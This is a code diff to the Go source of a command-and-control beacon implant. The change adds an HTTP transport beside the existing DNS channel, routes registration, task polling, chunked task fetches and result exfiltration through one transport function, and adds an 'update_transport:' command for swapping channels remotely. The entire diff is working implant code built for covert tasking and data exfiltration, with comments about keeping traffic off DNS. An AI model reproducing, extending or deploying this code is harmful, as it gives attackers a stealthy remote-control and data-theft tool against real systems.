@@ -35,15 +35,19 @@ type Beacon struct {
 	running  atomic.Bool
 	regStage atomic.Int32 // 0=not started, 3=complete (use POLL); 1,2 are intermediate staged steps
 
+	// transport decides whether an exchange goes over DNS or HTTP, and owns the
+	// HTTP transports. Set at build time, replaceable at runtime.
+	transport *transportManager
+
 	// Operator-defined variables: expanded in commands before execution
 	vars   map[string]string
 	varsMu sync.RWMutex
 
 	// Task dedup: prevents re-execution when Shadow Mesh delivers the same task via multiple DNS servers
-	executedMu       sync.Mutex
-	executedTasks    map[string]bool
-	executedOrder    []string
-	executedMaxSize  int
+	executedMu      sync.Mutex
+	executedTasks   map[string]bool
+	executedOrder   []string
+	executedMaxSize int
 }
 
 // newBeacon creates a new beacon instance with system information
@@ -85,6 +89,7 @@ func newBeacon() (*Beacon, error) {
 		vars:            make(map[string]string),
 		executedTasks:   make(map[string]bool),
 		executedMaxSize: 100,
+		transport:       newTransportManager(client.config, client.aesKey),
 	}, nil
 }
 
@@ -109,23 +114,54 @@ func (b *Beacon) checkIn() (string, error) {
 		pollPhase := b.client.config.GetPollPhase()
 		pollData := fmt.Sprintf("POLL|%s", b.id)
 
+		// HTTP-only: the listener delivers the task in the response, and no DNS
+		// C2 query is sent at all.
+		if b.transport != nil && b.transport.Mode() == transportHTTP {
+			response, err := b.sendControlMessage(pollData, pollPhase.PhaseConfig)
+			if err != nil {
+				return "", fmt.Errorf("HTTP poll failed: %v", err)
+			}
+			if response == "REREG" {
+				b.regStage.Store(0)
+				return "", nil
+			}
+			return response, nil
+		}
+
 		if pollPhase.QueryType == "A" {
-			// Two-step A-record poll: probe for task signal, then TXT follow-up
+			// Two-step A-record poll: probe for task signal, then fetch the task.
+			// The probe is the readiness signal and always goes over DNS, even
+			// in dual mode - that is what dual mode means.
 			response, err := b.client.sendPhaseCommand(pollData, pollPhase.PhaseConfig)
 			if err != nil {
 				return "", fmt.Errorf("poll failed: %v", err)
 			}
 
 			if response == pollPhase.ARecordTaskIP {
+				// Dual mode: the A record said a task is ready, so fetch it over
+				// HTTP without the DNS follow-up delay. That delay exists to
+				// spread DNS queries, which one HTTP request does not need.
+				if b.transport != nil && b.transport.Mode() == transportDual && b.transport.ShouldUseHTTP() {
+					if taskResponse, httpErr := b.transport.Send("task", pollData); httpErr == nil {
+						if taskResponse == "REREG" {
+							b.regStage.Store(0)
+							return "", nil
+						}
+						return taskResponse, nil
+					}
+					// The failure already counts towards the fallback threshold;
+					// continue to the DNS path below.
+				}
+
 				// Task pending — wait configured delay, then do TXT follow-up
 				followUp := pollPhase.TxtFollowUpSecs
 				if followUp <= 0 {
 					cfg := b.client.config
 					spread := cfg.SleepMax - cfg.SleepMin + 1
-				if spread <= 0 {
-					spread = 1
-				}
-				followUp = cfg.SleepMin + rand.Intn(spread)
+					if spread <= 0 {
+						spread = 1
+					}
+					followUp = cfg.SleepMin + rand.Intn(spread)
 				}
 				time.Sleep(time.Duration(followUp) * time.Second)
 
@@ -150,8 +186,10 @@ func (b *Beacon) checkIn() (string, error) {
 			return "ACK", nil
 		}
 
-		// TXT mode poll (default) — works like before
-		response, err := b.client.sendPhaseCommand(pollData, pollPhase.PhaseConfig)
+		// TXT mode poll (default). Routed through the transport seam so a dual
+		// mode beacon fetches over HTTP while HTTP is healthy, and a DNS-mode
+		// beacon behaves exactly as before.
+		response, err := b.sendControlMessage(pollData, pollPhase.PhaseConfig)
 		if err != nil {
 			return "", fmt.Errorf("poll failed: %v", err)
 		}
@@ -201,6 +239,21 @@ func (b *Beacon) checkIn() (string, error) {
 
 	// Registration uses registration-phase config
 	regPhase := b.client.config.GetRegistrationPhase()
+
+	// HTTP carrier: register over HTTP first, so the server knows this beacon
+	// before it is asked to signal tasks over DNS. This applies to both http and
+	// dual mode - in dual mode DNS is reserved for the readiness signal.
+	if b.transport != nil && b.transport.Mode() != transportDNS {
+		if _, err := b.sendControlMessage(checkInData, regPhase); err != nil {
+			return "", fmt.Errorf("check-in failed: %v", err)
+		}
+		if b.client.config.StagedRegistration {
+			b.regStage.Store(stage + 1)
+		} else {
+			b.regStage.Store(3)
+		}
+		return "ACK", nil
+	}
 
 	if regPhase.QueryType == "A" {
 		// A-record registration: send CHK, server ACKs with IP
@@ -429,7 +482,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	var err error
 	metaSent := false
 	for metaAttempt := 1; metaAttempt <= 3; metaAttempt++ {
-		_, err = b.client.sendPhaseCommand(metaData, exfilPhase)
+		_, err = b.sendControlMessage(metaData, exfilPhase)
 		if err == nil {
 			metaSent = true
 			break
@@ -475,7 +528,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 		chunkSent := false
 		for chunkAttempt := 1; chunkAttempt <= 2; chunkAttempt++ {
-			_, err := b.client.sendPhaseCommand(chunkData, exfilPhase)
+			_, err := b.sendControlMessage(chunkData, exfilPhase)
 			if err == nil {
 				chunkSent = true
 				break
@@ -504,7 +557,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 	completeData := fmt.Sprintf("RESULT_COMPLETE|%s|%s|%d", b.id, taskID, totalChunks)
 	for attempt := 1; attempt <= 3; attempt++ {
-		_, err = b.client.sendPhaseCommand(completeData, exfilPhase)
+		_, err = b.sendControlMessage(completeData, exfilPhase)
 		if err == nil {
 			return nil
 		}
@@ -514,6 +567,50 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	}
 
 	return fmt.Errorf("failed to send completion message after 3 attempts: %v", err)
+}
+
+// operationForMessage maps a protocol message to the listener operation that
+// should carry it. The listener routes by path, so this is what decides which
+// configured URI a message travels to.
+func operationForMessage(message string) string {
+	messageType, _, _ := strings.Cut(message, "|")
+	switch messageType {
+	case "CHK", "CHK_META":
+		return "register"
+	case "POLL", "TASKGET":
+		return "task"
+	case "RESULT_META", "DATA", "RESULT_COMPLETE", "RESULT":
+		return "result"
+	case "STATUS":
+		return "ack"
+	default:
+		return "result"
+	}
+}
+
+// sendControlMessage delivers a protocol message over the active transport,
+// falling back to DNS only in dual mode.
+//
+// This is the single seam for beacon traffic. Routing every exchange through it
+// means a transport decision cannot be applied to tasking but forgotten for
+// results, which would leak half the protocol back onto DNS.
+//
+// In http mode a failure is returned rather than retried over DNS: the operator
+// chose HTTP-only, and silently switching transports would be a surprise. In
+// dual mode DNS is the documented fallback.
+func (b *Beacon) sendControlMessage(message string, phase PhaseConfig) (string, error) {
+	if b.transport == nil || !b.transport.ShouldUseHTTP() {
+		return b.client.sendPhaseCommand(message, phase)
+	}
+
+	response, err := b.transport.Send(operationForMessage(message), message)
+	if err == nil {
+		return response, nil
+	}
+	if b.transport.Mode() == transportHTTP {
+		return "", err
+	}
+	return b.client.sendPhaseCommand(message, phase)
 }
 
 // parseTask parses a task from the DNS server response.
@@ -551,7 +648,10 @@ func (b *Beacon) requestRemainingChunks(taskID string, totalChunks int, firstChu
 			time.Sleep(jitter)
 
 			query := fmt.Sprintf("TASKGET|%s|%s|%d", b.id, taskID, i)
-			resp, qErr := b.client.sendPhaseCommand(query, txtPhase)
+			// Routed through the transport seam: a chunk fetch is a normal C2
+			// exchange, so an HTTP-carried beacon must not fall back to DNS here
+			// while its tasking arrives over HTTP.
+			resp, qErr := b.sendControlMessage(query, txtPhase)
 			if qErr != nil {
 				err = qErr
 				continue
@@ -851,6 +951,22 @@ func (b *Beacon) runBeacon() {
 
 					// Continue to next check-in cycle immediately
 					// The sleep will happen at the top of the loop, then check-in will use the new domain list
+					return
+				}
+
+				if strings.HasPrefix(command, "update_transport:") {
+					// System command on the same fire-and-forget channel as
+					// update_domains: replace the transport configuration
+					// without a rebuild. No result is sent, matching the domain
+					// update behaviour: a reply here would look like a task
+					// result on whichever transport is newly active.
+					payload := command[len("update_transport:"):]
+
+					// ApplyUpdate leaves the previous configuration live when the
+					// payload is unusable. That is the only safe behaviour for a
+					// fire-and-forget update: replying would mean sending traffic
+					// on the very transport being replaced.
+					_ = b.transport.ApplyUpdate(payload)
 					return
 				}
 
